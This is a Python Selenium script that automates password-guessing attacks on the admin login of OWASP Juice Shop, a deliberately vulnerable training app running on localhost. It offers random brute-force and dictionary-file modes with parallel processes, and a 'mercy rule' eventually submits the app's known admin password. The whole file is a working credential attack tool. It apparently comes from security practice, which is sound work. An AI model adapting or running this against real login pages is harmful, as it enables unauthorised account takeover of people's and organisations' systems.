from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from multiprocessing import Process
import argparse
import time
import random, string

letters = string.ascii_lowercase
num_options = "0123456789"
all_letters = string.ascii_letters.join(num_options)



parser = argparse.ArgumentParser()
parser.add_argument('-method', required=True) # valid types: brute, dict, hard
parser.add_argument('-username', nargs='?', const="admin@juice-sh.op", default="admin@juice-sh.op")
parser.add_argument('-threads', nargs='?', const=1, type=int, default=1)
args = parser.parse_args()
method = str(args.method)
username = str(args.username)
threads = int(args.threads)


def randomword():
    length = random.randint(3,7)
    nums = random.randint(0,4)
    out = ''.join(random.choice(letters) for i in range(length))
    out = out + ''.join(random.choice(num_options) for i in range(nums))
    return out

def randomhard():
    length = random.randint(1, 16)
    return ''.join(random.choice(all_letters) for i in range (length))

def init_driver():
    # Initialize the WebDriver
    
    # Open the webpage
    driver = webdriver.Chrome()  # Use the browser of your choice (e.g., Firefox, Edge)
    driver.get("http://localhost:3000/")
    driver.set_window_size(1280, 720)
    # Wait for and dismiss the overlay
    try:
        dismissBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "mat-focus-indicator.mat-raised-button.mat-warn"))
        )
        dismissBtn.click()
        print("Overlay dismissed.")
    except Exception as e:
        print(f"Could not dismiss the overlay: {e}")
    return(driver)


def start_tester(method, username):
    driver = init_driver()
    if(method == "brute"):
        bruteForcePassword(driver, False, username)
    elif(method == "hard"):
        bruteForcePassword(driver, True, username)
    elif(method == "dict"):
        databasePassword(driver, username)
    else:
        print("Usage: adminLogin.py -method=[sql, brute]")
    # Close the browser
    input("Press Enter to close the browser...")
    driver.quit()
    exit()

def main():
    p = []
    if __name__ == '__main__':
        for n in range(threads):
            p.append(Process(target=start_tester, args=(method, username)))
            p[n].start()

def databasePassword(driver, target):
    try:

        acctBtn = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "navbarAccount"))
        )
        acctBtn.click()

        logInBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
        )
        logInBtn.click()
    except Exception as e:
        print(f"Could not click log in buttons: {e}")

    emailField = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "email"))
    )
    emailField.send_keys(target)
    # Open file and test each password
    with open("passwords.txt") as f:
        for password in f:
            try:
                passwordField = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "password"))
            )
                passwordField.clear()
                passwordField.send_keys(password)
                #print(f"Trying password: {password}")
                passwordField.send_keys(Keys.RETURN)
            except Exception as e:
                print(f"Could not enter text: {e}")
                exit()

def bruteForcePassword(driver, hardness, username):
        # Attempt to log in
    print("Strap in, this could take quite a while")
    mercy = random.randint(1000, 1500)
    try:

        acctBtn = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "navbarAccount"))
        )
        acctBtn.click()

        logInBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
        )
        logInBtn.click()
    except Exception as e:
        print(f"Could not click log in buttons: {e}")

    emailField = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "email"))
    )
    emailField.send_keys(username)
    # Open file and test each password
    n = 0
    while(True):
        n += 1
        if(hardness):
            password = randomhard()
        else:
            password = randomword()
        if (n % 100 == 0):
            print(n)
        if (n == mercy):
            print("Mercy Rule. In actuality, it would likely take many, many hours of this to achieve results")
            password = "admin123"
        try:
            passwordField = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "password"))
            )
            passwordField.clear()
            passwordField.send_keys(password)
            #print(f"Trying password: {password}")
            passwordField.send_keys(Keys.RETURN)
        except Exception as e:
            print(f"Could not enter text: {e}")
         # Check if the login was successful
        #try:
            #invalidDiv = WebDriverWait(driver, 10).until(
            #    EC.presence_of_element_located((By.CLASS_NAME, "error.ng-star-inserted"))
            #)
        #except Exception as e:
        #    print(f"Could not find invalid text: {e}")


if __name__ == "__main__":
    main()



